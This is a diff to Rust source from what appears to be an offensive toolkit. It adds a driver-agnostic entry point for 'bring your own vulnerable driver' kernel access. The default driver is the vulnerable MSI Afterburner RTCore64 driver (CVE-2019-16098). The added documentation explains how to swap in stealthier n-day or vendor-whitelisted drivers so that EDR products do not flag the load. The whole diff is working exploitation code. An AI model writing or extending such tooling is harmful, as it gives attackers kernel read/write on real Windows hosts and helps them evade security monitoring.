@@ -117,6 +117,11 @@ pub unsafe fn bootstrap_chain(
 
 /// The full BYOVD bootstrap: load driver → open device → return KernelRw.
 ///
+/// Convenience wrapper around [`bootstrap_byovd_with`] that uses the reference
+/// [`RtCore64`] (MSI Afterburner, CVE-2019-16098) as the vulnerable driver.
+/// Use [`bootstrap_byovd_with`] to plug in an alternative `VulnDriverIoctl`
+/// implementation (a stealthier Nday, a vendor whitelisted driver, etc.).
+///
 /// `sys_path` = UTF-16 path to the .sys file on disk (e.g. `C:\temp\RTCore64.sys`).
 /// `svc_name` = the service name for the registry key (e.g. `RTCore64`).
 ///
@@ -129,12 +134,44 @@ pub unsafe fn bootstrap_byovd(
     sys_path: &[u16],
     svc_name: &[u16],
 ) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
+    // The default reference impl. The driver is hardcoded here for ergonomics;
+    // operators needing a different driver call bootstrap_byovd_with directly.
+    unsafe { bootstrap_byovd_with(sys_path, svc_name, Box::new(RtCore64)) }
+}
+
+/// BYOVD bootstrap with an explicit vulnerable-driver implementation.
+///
+/// This is the driver-agnostic entry point: any kernel R/W primitive that
+/// implements [`VulnDriverIoctl`] can be plugged in. The `driver` argument
+/// owns the per-driver IOCTL contract (device name, read/write IOCTL codes,
+/// arg-struct layout) — see the trait docs in [`byovd`] for how to add a new
+/// driver. The driver is loaded from `sys_path`/`svc_name` (same as the
+/// reference path), then its device is opened via the supplied `driver`'s
+/// `device_name()` + IOCTL protocol.
+///
+/// # When to use this over [`bootstrap_byovd`]
+///
+/// - Engaging a target where `RTCore64.sys` is IOC-flagged by the EDR.
+/// - Using a stealthier Nday driver that the EDR doesn't signature on yet.
+/// - Using a vendor-whitelisted driver (signed, low-reputation cost) as the
+///   kernel R/W primitive.
+///
+/// # Safety
+/// Loads a driver into the kernel. BSOD risk. Caller must have
+/// SeLoadDriverPrivilege. The supplied `driver`'s IOCTL contract must be
+/// correct for the driver loaded at `sys_path` — a mismatch causes garbage
+/// kernel reads/writes and likely BSOD. Test on a VM.
+pub unsafe fn bootstrap_byovd_with(
+    sys_path: &[u16],
+    svc_name: &[u16],
+    driver: Box<dyn VulnDriverIoctl>,
+) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
     // 1. Load the driver.
     let loaded = unsafe { driver_load::LoadedDriver::load(sys_path, svc_name) }
         .map_err(|e| KitError::Other(alloc::format!("driver load: {}", e)))?;
 
-    // 2. Open the device (CreateFileW on \\.\RTCore64).
-    let driver: Box<dyn VulnDriverIoctl> = Box::new(RtCore64);
+    // 2. Open the device via the supplied driver's IOCTL contract
+    //    (CreateFileW on driver.device_name(), e.g. \\.\RTCore64).
     let krw = match unsafe { ByovdDriver::open(driver) } {
         Ok(k) => k,
         Err(e) => {
